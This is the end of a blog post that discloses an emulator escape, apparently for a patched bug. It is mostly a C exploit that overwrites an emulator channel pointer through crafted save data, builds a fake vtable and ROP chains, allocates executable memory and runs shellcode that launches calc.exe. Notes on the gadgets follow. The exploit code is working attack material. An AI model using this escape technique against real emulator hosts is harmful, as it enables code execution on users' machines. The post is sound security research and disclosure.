+<span class=giallo-l><span style=color:#569cd6>static const</span><span> u8 shellcode[] </span><span style=color:#d4d4d4>=</span></span>
+<span class=giallo-l><span style=color:#ce9178>    "</span><span style=color:#d7ba7d>\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b</span><span style=color:#ce9178>"</span></span>
+<span class=giallo-l><span style=color:#ce9178>    "</span><span style=color:#d7ba7d>\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2</span><span style=color:#ce9178>"</span></span>
+<span class=giallo-l><span style=color:#ce9178>    "</span><span style=color:#d7ba7d>\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b</span><span style=color:#ce9178>"</span></span>
+<span class=giallo-l><span style=color:#ce9178>    "</span><span style=color:#d7ba7d>\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04</span><span style=color:#ce9178>"</span></span>
+<span class=giallo-l><span style=color:#ce9178>    "</span><span style=color:#d7ba7d>\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0</span><span style=color:#ce9178>"</span></span>
+<span class=giallo-l><span style=color:#ce9178>    "</span><span style=color:#d7ba7d>\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2</span><span style=color:#ce9178>"</span></span>
+<span class=giallo-l><span style=color:#ce9178>    "</span><span style=color:#d7ba7d>\x48\x83\xec\x20\x41\xff\xd6\xcc</span><span style=color:#ce9178>"</span><span>;</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#569cd6>int</span><span style=color:#dcdcaa> main</span><span>() {</span></span>
+<span class=giallo-l><span>    u64 rop_3[]</span><span style=color:#dcdcaa> __attribute__</span><span>((</span><span style=color:#dcdcaa>aligned</span><span>(</span><span style=color:#b5cea8>16</span><span>)))</span><span style=color:#d4d4d4> =</span><span> {</span></span>
+<span class=giallo-l><span style=color:#6a9955>        // pop rdx; ret</span></span>
+<span class=giallo-l><span style=color:#b5cea8>        0x4C06B2</span><span>,</span></span>
+<span class=giallo-l><span style=color:#dcdcaa>        guest_to_host_addr</span><span>(shellcode),</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#6a9955>        // pop r8; ret</span></span>
+<span class=giallo-l><span style=color:#b5cea8>        0x4EE16B</span><span>,</span></span>
+<span class=giallo-l><span style=color:#569cd6>        sizeof</span><span>(shellcode),</span></span>
+<span class=giallo-l><span>        </span></span>
+<span class=giallo-l><span style=color:#6a9955>        // memcpy</span></span>
+<span class=giallo-l><span style=color:#b5cea8>        0xEB7E52</span><span>,</span></span>
+<span class=giallo-l><span>        </span></span>
+<span class=giallo-l><span style=color:#6a9955>        // call rax</span></span>
+<span class=giallo-l><span style=color:#b5cea8>        0x41CFE9</span><span>,</span></span>
+<span class=giallo-l><span>        </span></span>
+<span class=giallo-l><span style=color:#b5cea8>        0</span><span>,</span></span>
+<span class=giallo-l><span style=color:#b5cea8>        0</span><span>,</span></span>
+<span class=giallo-l><span>        </span></span>
+<span class=giallo-l><span style=color:#6a9955>        // Call from rop_2 points here</span></span>
+<span class=giallo-l><span style=color:#6a9955>        // xchg esp, edx; ret</span></span>
+<span class=giallo-l><span style=color:#b5cea8>        0x898285</span><span>,</span></span>
+<span class=giallo-l><span>    };</span></span>
+<span class=giallo-l><span style=color:#c586c0>    for</span><span> (</span><span style=color:#569cd6>int</span><span> i </span><span style=color:#d4d4d4>=</span><span style=color:#b5cea8> 0</span><span>; i </span><span style=color:#d4d4d4>&lt;</span><span style=color:#569cd6> sizeof</span><span>(rop_3)</span><span style=color:#d4d4d4> /</span><span style=color:#569cd6> sizeof</span><span>(</span><span style=color:#9cdcfe>rop_3</span><span>[</span><span style=color:#b5cea8>0</span><span>]); i</span><span style=color:#d4d4d4>++</span><span>)</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>        rop_3</span><span>[i]</span><span style=color:#d4d4d4> =</span><span style=color:#dcdcaa> bswap64</span><span>(</span><span style=color:#9cdcfe>rop_3</span><span>[i]);</span></span>
+<span class=giallo-l><span>    </span></span>
+<span class=giallo-l><span>    u64 rop_2[]</span><span style=color:#dcdcaa> __attribute__</span><span>((</span><span style=color:#dcdcaa>aligned</span><span>(</span><span style=color:#b5cea8>16</span><span>)))</span><span style=color:#d4d4d4> =</span><span> {</span></span>
+<span class=giallo-l><span style=color:#6a9955>        // pop rcx; ret</span></span>
+<span class=giallo-l><span style=color:#b5cea8>        0x52ABB3</span><span>,</span></span>
+<span class=giallo-l><span style=color:#569cd6>        sizeof</span><span>(shellcode),</span></span>
+<span class=giallo-l><span>        </span></span>
+<span class=giallo-l><span style=color:#6a9955>        // Common::AllocateExecutableMemory</span></span>
+<span class=giallo-l><span style=color:#6a9955>        // Second argument doesn't matter</span></span>
+<span class=giallo-l><span style=color:#b5cea8>        0xFD2F70</span><span>,</span></span>
+<span class=giallo-l><span>        </span></span>
+<span class=giallo-l><span style=color:#6a9955>        // add rsp, 0x38; ret</span></span>
+<span class=giallo-l><span style=color:#b5cea8>        0x40C3DE</span><span>,</span></span>
+<span class=giallo-l><span style=color:#b5cea8>        0</span><span>,</span><span style=color:#b5cea8> 0</span><span>,</span><span style=color:#b5cea8> 0</span><span>,</span><span style=color:#b5cea8> 0</span><span>,</span><span style=color:#b5cea8> 0</span><span>,</span><span style=color:#b5cea8> 0</span><span>,</span><span style=color:#b5cea8> 0</span><span>,</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#6a9955>        // pop rdx; ret</span></span>
+<span class=giallo-l><span style=color:#b5cea8>        0x4C06B2</span><span>,</span></span>
+<span class=giallo-l><span style=color:#dcdcaa>        guest_to_host_addr</span><span>(rop_3),</span></span>
+<span class=giallo-l><span>        </span></span>
+<span class=giallo-l><span style=color:#6a9955>        // mov rcx, rax; call qword ptr [rdx+40h]</span></span>
+<span class=giallo-l><span style=color:#b5cea8>        0x10EE58A</span></span>
+<span class=giallo-l><span>    };</span></span>
+<span class=giallo-l><span style=color:#c586c0>    for</span><span> (</span><span style=color:#569cd6>int</span><span> i </span><span style=color:#d4d4d4>=</span><span style=color:#b5cea8> 0</span><span>; i </span><span style=color:#d4d4d4>&lt;</span><span style=color:#569cd6> sizeof</span><span>(rop_2)</span><span style=color:#d4d4d4> /</span><span style=color:#569cd6> sizeof</span><span>(</span><span style=color:#9cdcfe>rop_2</span><span>[</span><span style=color:#b5cea8>0</span><span>]); i</span><span style=color:#d4d4d4>++</span><span>)</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>        rop_2</span><span>[i]</span><span style=color:#d4d4d4> =</span><span style=color:#dcdcaa> bswap64</span><span>(</span><span style=color:#9cdcfe>rop_2</span><span>[i]);</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#6a9955>    // Since rdx points here, this doubles as the first ROP chain</span></span>
+<span class=giallo-l><span>    u64 fake_vtbl[]</span><span style=color:#dcdcaa> __attribute__</span><span>((</span><span style=color:#dcdcaa>aligned</span><span>(</span><span style=color:#b5cea8>16</span><span>)))</span><span style=color:#d4d4d4> =</span><span> {</span></span>
+<span class=giallo-l><span style=color:#6a9955>        // pop rax; ret</span></span>
+<span class=giallo-l><span style=color:#b5cea8>        0x4179B0</span><span>,</span></span>
+<span class=giallo-l><span style=color:#dcdcaa>        guest_to_host_addr</span><span>(rop_2),</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#6a9955>        // mov rsp, rax; ret</span></span>
+<span class=giallo-l><span style=color:#b5cea8>        0x40EAB0</span><span>,</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#b5cea8>        0x0</span><span>,</span></span>
+<span class=giallo-l><span style=color:#b5cea8>        0x0</span><span>,</span></span>
+<span class=giallo-l><span style=color:#b5cea8>        0x0</span><span>,</span></span>
+<span class=giallo-l><span style=color:#b5cea8>        0x0</span><span>,</span></span>
+<span class=giallo-l><span style=color:#b5cea8>        0x0</span><span>,</span></span>
+<span class=giallo-l><span style=color:#b5cea8>        0x0</span><span>,</span></span>
+<span class=giallo-l><span style=color:#b5cea8>        0x0</span><span>,</span></span>
+<span class=giallo-l><span style=color:#b5cea8>        0x0</span><span>,</span></span>
+<span class=giallo-l><span style=color:#b5cea8>        0x0</span><span>,</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#6a9955>        // Initial call points here</span></span>
+<span class=giallo-l><span style=color:#6a9955>        // xchg esp, edx; ret</span></span>
+<span class=giallo-l><span style=color:#b5cea8>        0x898285</span><span>,</span></span>
+<span class=giallo-l><span>    };</span></span>
+<span class=giallo-l><span style=color:#c586c0>    for</span><span> (</span><span style=color:#569cd6>int</span><span> i </span><span style=color:#d4d4d4>=</span><span style=color:#b5cea8> 0</span><span>; i </span><span style=color:#d4d4d4>&lt;</span><span style=color:#569cd6> sizeof</span><span>(fake_vtbl)</span><span style=color:#d4d4d4> /</span><span style=color:#569cd6> sizeof</span><span>(</span><span style=color:#9cdcfe>fake_vtbl</span><span>[</span><span style=color:#b5cea8>0</span><span>]); i</span><span style=color:#d4d4d4>++</span><span>)</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>        fake_vtbl</span><span>[i]</span><span style=color:#d4d4d4> =</span><span style=color:#dcdcaa> bswap64</span><span>(</span><span style=color:#9cdcfe>fake_vtbl</span><span>[i]);</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span>    u64 fake_device </span><span style=color:#d4d4d4>=</span><span style=color:#dcdcaa> bswap64</span><span>(</span><span style=color:#dcdcaa>guest_to_host_addr</span><span>(fake_vtbl));</span></span>
+<span class=giallo-l><span>    </span></span>
+<span class=giallo-l><span>    CEXIChannel fake_channel;</span></span>
+<span class=giallo-l><span style=color:#dcdcaa>    memset</span><span>(</span><span style=color:#d4d4d4>&</span><span>fake_channel,</span><span style=color:#b5cea8> 0x99</span><span>,</span><span style=color:#569cd6> sizeof</span><span>(fake_channel));</span></span>
+<span class=giallo-l><span style=color:#c586c0>    for</span><span> (</span><span style=color:#569cd6>int</span><span> i </span><span style=color:#d4d4d4>=</span><span style=color:#b5cea8> 0</span><span>; i </span><span style=color:#d4d4d4>&lt;</span><span style=color:#b5cea8> 3</span><span>; i</span><span style=color:#d4d4d4>++</span><span>)</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>        fake_channel</span><span>.</span><span style=color:#9cdcfe>m_devices</span><span>[i]</span><span style=color:#d4d4d4> =</span><span style=color:#dcdcaa> bswap64</span><span>(</span><span style=color:#dcdcaa>guest_to_host_addr</span><span>(</span><span style=color:#d4d4d4>&</span><span>fake_device));</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#6a9955>    // Overwrites g_Channels[0]</span></span>
+<span class=giallo-l><span style=color:#569cd6>    static char</span><span style=color:#9cdcfe> buf</span><span>[TARGET_PTR_OFFSET </span><span style=color:#d4d4d4>+</span><span style=color:#b5cea8> 8</span><span>];</span></span>
+<span class=giallo-l><span>    u64 ptr </span><span style=color:#d4d4d4>=</span><span style=color:#dcdcaa> bswap64</span><span>(</span><span style=color:#dcdcaa>guest_to_host_addr</span><span>(</span><span style=color:#d4d4d4>&</span><span>fake_channel));</span></span>
+<span class=giallo-l><span style=color:#dcdcaa>    memcpy</span><span>(buf </span><span style=color:#d4d4d4>+</span><span> TARGET_PTR_OFFSET,</span><span style=color:#d4d4d4> &</span><span>ptr,</span><span style=color:#569cd6> sizeof</span><span>(ptr));</span></span>
+<span class=giallo-l><span style=color:#dcdcaa>    __sram_write</span><span>(buf,</span><span style=color:#569cd6> sizeof</span><span>(buf));</span></span>
+<span class=giallo-l><span>}</span></span></code></pre><p>A few notes on it:<ul><li>That <code>xchg esp, edx; ret</code> stack pivot gadget works because the Fastmem arena gets allocated at a low enough address for main RAM to fit within the first 4GB of address space.<li>The <code>mov rsp, rax; ret</code> isn't a lucky desynced instruction but is actually the end of <code>ff_put_h264_chroma_mc8_rnd_mmx</code>. No idea why it's there, but it's a great gadget, so I can't complain.<li>Exploiting an emulator with a JIT means that I get convenient functions like <code>Common::AllocateExecutableMemory</code> for getting RWX memory instead of having to <code>VirtualAlloc</code> it myself.</ul><iframe allowfullscreen frameborder=0 referrerpolicy=strict-origin-when-cross-origin src=https://www.youtube-nocookie.com/embed/6Iz5MQybV3E style=aspect-ratio:32/9 width=100%></iframe><p>I hope you had as much fun reading this as I did working on it! This was something I wanted to write back in January, but I put it off until now. What really pushed me to write this post was getting extremely annoyed at the number of clearly LLM-generated technical blog posts I kept seeing. I figured the only way to get more half-decent posts in the world is to start writing them myself again.<p>Thanks to <a href=https://github.com/JLaferri rel=external>Fizzi</a> for the quick response in getting this vulnerability fixed.</section><footer><nav class="c-pagination p-pagination"><div class=c-pagination__ctrl><div class=c-pagination__newer></div><div class=c-pagination__older></div></div></nav></footer></article></main><footer class=l-footer><p class=p-copyright><strong>Duct taped together with ❤️</strong><br>Github: <a href=https://github.com/khang06 rel=external>khang06</a> | Discord: khangaroo<br>Theme: Modified <a href=https://github.com/lukehsiao/zola-pickles rel=external>zola-pickles</a></footer>
